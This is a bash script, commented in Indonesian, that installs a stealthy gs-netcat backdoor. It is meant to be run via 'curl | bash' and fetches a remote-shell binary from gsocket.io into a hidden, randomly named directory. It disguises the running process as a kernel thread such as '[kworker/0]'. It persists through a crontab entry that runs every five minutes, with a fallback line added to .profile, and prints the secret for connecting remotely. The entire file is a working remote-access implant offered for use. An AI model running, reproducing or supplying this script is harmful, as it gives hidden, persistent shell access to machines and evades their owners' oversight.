#!/usr/bin/env bash
# Lightweight & stealthy gs-netcat deployer
# Usage: curl -sL https://your.domain/deploy-lite.sh | bash
# Or with custom secret: X=MySecret curl -sL ... | bash

set -e

# -------------------- Konfigurasi --------------------
SECRET="${X:-$(tr -dc 'a-zA-Z0-9' </dev/urandom | fold -w 16 | head -n1)}"
# Nama proses akan meniru proses kernel
PROC_NAMES=("[kworker/0]" "[kworker/1]" "[kworker/2]" "[kworker/3]" "[rcu_preempt]" "[kswapd0]" "[ksmd]")
PROC_NAME="${PROC_NAMES[$((RANDOM % ${#PROC_NAMES[@]}))]}"
# Nama binary dan direktori acak
BIN_NAME=".$(tr -dc 'a-z' </dev/urandom | fold -w 8 | head -n1)"
DIR_NAME=".$(tr -dc 'a-z' </dev/urandom | fold -w 6 | head -n1)"
INSTALL_DIR="${HOME}/${DIR_NAME}"
BIN_PATH="${INSTALL_DIR}/${BIN_NAME}"
SECRET_FILE="${INSTALL_DIR}/.secret"

# -------------------- Deteksi arsitektur --------------------
OS="$(uname -s)"
ARCH="$(uname -m)"
case "$OS" in
  Linux)
    case "$ARCH" in
      x86_64)  URL="https://gsocket.io/bin/gs-netcat_linux-x86_64" ;;
      aarch64) URL="https://gsocket.io/bin/gs-netcat_linux-aarch64" ;;
      armv7l)  URL="https://gsocket.io/bin/gs-netcat_linux-armv7l" ;;
      armv6l)  URL="https://gsocket.io/bin/gs-netcat_linux-armv6" ;;
      *) echo "Unsupported arch: $ARCH"; exit 1 ;;
    esac
    ;;
  Darwin)
    URL="https://gsocket.io/bin/gs-netcat_macOS-x86_64" ;;
  *)
    echo "Unsupported OS: $OS"; exit 1 ;;
esac

# -------------------- Buat direktori tersembunyi --------------------
mkdir -p "$INSTALL_DIR" 2>/dev/null
cd "$INSTALL_DIR" || exit 1

# -------------------- Download binary dengan retry + fallback --------------------
download_bin() {
  local max_try=5
  local try=0
  local wait=2
  local url="$1"
  local out="$2"
  while [[ $try -lt $max_try ]]; do
    ((try++))
    echo "→ Download attempt $try/$max_try ..." >&2
    if curl -fsSL --connect-timeout 10 --retry 3 --retry-delay 2 -o "$out" "$url" 2>/dev/null; then
      [ -s "$out" ] && return 0
    fi
    echo "  failed, retry in ${wait}s" >&2
    sleep $wait
    wait=$((wait * 2))
    [[ $wait -gt 30 ]] && wait=30
  done
  return 1
}

# Coba URL utama, jika gagal pakai fallback (gsocket.io/bin)
if ! download_bin "$URL" "$BIN_NAME"; then
  FALLBACK_URL="https://gsocket.io/bin/$(basename "$URL")"
  echo "→ Using fallback URL" >&2
  download_bin "$FALLBACK_URL" "$BIN_NAME" || {
    echo "Download failed." >&2
    exit 1
  }
fi

chmod 700 "$BIN_NAME"

# -------------------- Simpan secret --------------------
echo "$SECRET" > "$SECRET_FILE"
chmod 600 "$SECRET_FILE"

# -------------------- Jalankan sekali (test) --------------------
# Gunakan exec -a untuk menyamarkan nama proses
(cd "$HOME" && exec -a "$PROC_NAME" "$BIN_PATH" -s "$SECRET" -D 2>/dev/null &)

# -------------------- Persistence via crontab (user) --------------------
CRON_CMD="(pgrep -f '$BIN_NAME' >/dev/null || cd '$HOME' && exec -a '$PROC_NAME' '$BIN_PATH' -s '$SECRET' -D) >/dev/null 2>&1"
(crontab -l 2>/dev/null | grep -v "$BIN_NAME" ; echo "*/5 * * * * $CRON_CMD") | crontab - 2>/dev/null

# -------------------- Fallback persistence via .profile --------------------
if ! crontab -l 2>/dev/null | grep -q "$BIN_NAME"; then
  echo "[ -x '$BIN_PATH' ] && (pgrep -f '$BIN_NAME' >/dev/null || cd '$HOME' && exec -a '$PROC_NAME' '$BIN_PATH' -s '$SECRET' -D) &" >> ~/.profile
fi

# -------------------- Output --------------------
echo -e "\n✅ Installation done."
echo "🔑 Secret: $SECRET"
echo "🔗 Connect: gs-netcat -s $SECRET -i"
echo "🕵️ Process hidden as: $PROC_NAME"
echo "📁 Binary located: $BIN_PATH"
